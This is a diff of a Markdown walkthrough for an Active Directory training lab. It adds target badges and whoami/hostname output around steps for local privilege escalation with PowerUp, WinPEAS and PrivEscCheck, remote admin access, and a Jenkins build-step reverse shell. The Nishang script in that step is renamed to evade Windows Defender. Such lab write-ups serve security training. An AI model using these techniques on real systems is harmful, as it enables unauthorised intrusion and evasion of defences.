@@ -14,6 +14,18 @@
 
 **Local Privilege Escalation - PowerUp**
 
+![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`whoami`:
+```
+dcorp\student422
+```
+
+`hostname`:
+```
+dcorp-std422
+```
+
 We can use Powerup from PowerSploit module to check for any privilege escalation path.
 
 **Note:** Remember to run PowerUp from a PowerShell session started using Invisi-Shell.
@@ -166,6 +178,8 @@ We can see that the `dcorp\student422` is a local administrator now.
 
 Just logoff and logon again and we have local administrator privileges!
 
+![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
 `whoami /all`:
 ```
 USER INFORMATION
@@ -184,7 +198,7 @@ Group Name                                 Type             SID                 
 ========================================== ================ ============================================= ==================================================
 Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
 BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Group used for deny only
+BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Group used for deny only❌
 BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
@@ -213,8 +227,21 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
+🚩
 
 **Local Privilege Escalation - WinPEAS**
+
+![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`whoami`:
+```
+dcorp\student422
+```
+
+`hostname`:
+```
+dcorp-std422
+```
 
 You can use WinPEAS using the following command. Note that we use an obfuscated version of WinPEAS.
 
@@ -270,10 +297,23 @@ Spend some time analyzing the output of WinPEAS. You will find useful informatio
 
 [SNIP]
 ```
+🚩
 
 **Local Privilege Escalation - PrivEscCheck**
 
 Similarly, we can use PrivEscCheck for a nice summary of possible privilege escalation opportunities.
+
+![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`whoami`:
+```
+dcorp\student422
+```
+
+`hostname`:
+```
+dcorp-std422
+```
 
 `. C:\AD\Tools\PrivEscCheck.ps1`
 
@@ -355,6 +395,7 @@ Vulnerable     : True
 
 [SNIP]
 ```
+🚩
 
 2. **Identify a machine in the domain where `studentx` has local administrative access**
 
@@ -362,7 +403,7 @@ Vulnerable     : True
 
 Now for the next task, to identify a machine in the domain where `student422` has local administrative access, use `Find-PSRemotingLocalAdminAccess.ps1`.
 
-`. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
+![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
@@ -373,6 +414,8 @@ dcorp\student422
 ```
 dcorp-std422
 ```
+
+`. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
 
 `Find-PSRemotingLocalAdminAccess`:
 ```
@@ -386,21 +429,20 @@ So, `student422` has administrative access on `dcorp-adminsrv` and on the studen
 Microsoft Windows [Version 10.0.20348.2762]
 (c) Microsoft Corporation. All rights reserved.
 
-C:\Users\student422>set username📌
-set username
+C:\Users\student422>
+```
+🚀
+
+![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`set username`:
+```
 USERNAME=student422
+```
 
-C:\Users\student422>set computername📌
-set computername
-COMPUTERNAME=DCORP-ADMINSRV
-
-C:\Users\student422>whoami
-whoami
-dcorp\student422
-
-C:\Users\student422>hostname
-hostname
-dcorp-adminsrv🚀
+`set computername`:
+```
+dcorp-adminsrv
 ```
 
 We can also use PowerShell Remoting.
@@ -410,8 +452,22 @@ We can also use PowerShell Remoting.
 [dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student422\Documents> whoami
 dcorp\student422
 [dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student422\Documents> hostname
-dcorp-adminsrv🚀
+dcorp-adminsrv
 ```
+🚀
+
+![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`whoami`:
+```
+dcorp\student422
+```
+
+`hostname`:
+```
+dcorp-adminsrv
+```
+🚩
 
 3. **Using privileges of a user on Jenkins on `172.16.3.11:8080`, get admin privileges on `172.16.3.11`, the `dcorp-ci` server**
 
@@ -431,6 +487,18 @@ Since Jenkins does not have a password policy many users use username as passwor
 Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use `download execute` cradle in Jenkins build step. You can use any reverse shell, below we are using a slightly modified version of `Invoke-PowerShellTcp` from Nishang. We renamed the function `Invoke-PowerShellTcp` to `Power` in the script to bypass Windows Defender.
 
 ![Invoke-PowerShellTcp - Obfuscation](./assets/screenshots/learning_objective_05_invokepowershelltcp_obfuscation.png)
+
+![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`whoami`:
+```
+dcorp\student422
+```
+
+`hostname`:
+```
+dcorp-std422
+```
 
 `ipconfig`:
 ```
@@ -462,7 +530,7 @@ Double check the following:
 - Check if there is any typo or extra space in the Windows Batch command that you used above in the Jenkins project.
 - After you build the project below, check the `Console Output` of the Jenkins Project to know more about the error.
 
-![HFS - Invoke-PowerShellTcp](./assets/screenshots/learning_objective_05_hfs_invokepowershelltcp.png)
+![HFS - Invoke-PowerShellTcp.ps1](./assets/screenshots/learning_objective_05_hfs_invokepowershelltcp.png)
 
 ![Windows Firewall - Turn Off](./assets/screenshots/learning_objective_05_windows_firewall_turn_off.png)
 
@@ -483,8 +551,11 @@ Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
 PS C:\Users\Administrator\.jenkins\workspace\Project11>
 ```
+🚀
 
 We can now run commands on the reverse shell.
+
+![Victim: dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
@@ -509,6 +580,7 @@ Ethernet adapter Ethernet:
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 172.16.3.254
 ```
+🚩
 
 ---
 ---
